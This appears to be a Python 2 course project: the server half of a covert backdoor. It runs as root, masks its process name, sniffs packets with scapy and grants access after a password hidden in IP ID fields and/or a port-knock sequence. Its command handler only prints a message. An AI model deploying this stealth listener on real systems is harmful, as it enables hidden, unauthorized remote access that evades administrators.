'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-server.py
-- 
-- FUNCTIONS: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
from config import *
from scapy.all import *
import os
import setproctitle

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def main():
	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	# Making sure we have at least 1 password or knock.
	# We need either a password or a knock in order for remote access to work
	if len(passwords) < 1 and len(knock) < 1:
		print "Check Config: Program must have at least 1 password or knock sequence"
		return
	else:
		# Masking the process name
		if len(mask) > 1:
			setproctitle.setproctitle(mask)

		try:
			# Setting up the packet filter to limit scanned packets
			# The stricter the filter, the fewer packets to process and therefore the better the performance
			packetFilter = "tcp and ip src not 127.0.0.1"
			if len(sources) > 0:
				first = True
				for source in sources:
					if first:
						packetFilter = packetFilter + "and (ip src " + source
						first = False
					else:
						packetFilter = packetFilter + " or ip src " + source
				packetFilter = packetFilter + ")"

			# Beginning Packet sniffing
			sniff(filter=packetFilter, prn=server())
		except KeyboardInterrupt:
			print "Shutting Down"

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: server
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: server()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def server():
	def getResponse(packet):
		# Check for the reset port first
		for port in reset:
			if port == packet[TCP].sport:
				for src, word in passCheck:
					if src == packet[IP].src:
						passCheck.remove([src, word])
						return
				return

		# Append our password and knock arrays with the next value for each and, when apropriate,
		# check if they are valid passphrases/knock sequences.
		if len(passwords) > 0:
			if checkPassword(packet[IP].src, packet[IP].id):
				if len(knock) > 0:
					if checkKnock(packet[IP].src, packet[TCP].dport):
						clientCommands(packet)
				else:
					clientCommands(packet)
		elif len(knock) > 0:
			if checkKnock(packet[IP].src, packet[TCP].dport):
				clientCommands(packet)

	return getResponse

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkPassword
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkPassword(ip, ipid)
--              ip   - The IP Address from which the packet was received
--              ipid - The ipid of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
passCheck = []
def checkPassword(ip, ipid):
	found = False
	c = chr(ipid & 0x00FF)
	for i in range(0, len(passCheck)):
		if passCheck[i][0] == ip:
			passCheck[i][1] += c
			
			tooLong = True
			for password in passwords:
				# Only compare to passwords short enough to be contained within the password buffer
				if len(passCheck[i][1]) >= len(password):
					if password in passCheck[i][1]:
						return True
				elif len(knock) == 0:
					tooLong = False

			# If the knock is disabled, clear the buffer once it's longer than the longest password
			if tooLong and len(knock) == 0:
				passCheck.pop(i)
			found = True
			break

	if found == False:
		passCheck.append([ip, str(c)])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkKnock(ip, port)
--              ip   - The IP Address from which the packet was received
--              port - The destination port of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
knockCheck = []
def checkKnock(ip, port):
	found = False
	for i in range(0, len(knockCheck)):
		if knockCheck[i][0] == ip:
			knockCheck[i][1].append(port)
			
			# Once we've collected enough knocks, check for a valid sequence
			if len(knockCheck[i][1]) == len(knock):
				goodKnock = True
				for j in range(0, len(knock)):
					if knock[j] != knockCheck[i][1][j]:
						goodKnock = False
				if goodKnock:
					return True
				else:
					# If it's invalid then flush the buffer
					knockCheck.pop(i)
					return False

			found = True
			break
	if found == False:
		knockCheck.append([ip, [port]])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: clientCommands
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: clientCommands(packet)
--              packet - The last packet received in the password/knock sequence
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def clientCommands(packet):
	print "Connection Established with " + packet[IP].src

main()

